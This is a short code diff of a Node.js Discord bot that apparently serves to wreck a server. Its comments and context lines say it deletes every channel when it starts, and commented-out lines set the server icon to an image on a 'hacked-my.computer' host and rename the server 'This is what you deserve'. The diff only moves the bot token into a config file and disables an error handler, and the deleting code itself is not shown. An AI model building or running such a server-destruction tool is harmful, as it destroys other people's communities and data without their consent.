@@ -1,6 +1,8 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
+const config = require("./config.json");
 const fs = require("fs")
+
 
 //on ready delete all channels
 client.on("ready", () => {
@@ -38,12 +40,14 @@ guild.setIcon("https://china.hacked-my.computer/95314b55.png");
 guild.setName("This is what you deserve");
 */
 
-
+/*
 //handle unexpected errors
 process.on("uncaughtException", err => {
     console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
     process.exit(1);
 });
+*/
+
 });
 
-client.login("token");
+client.login(config.token);
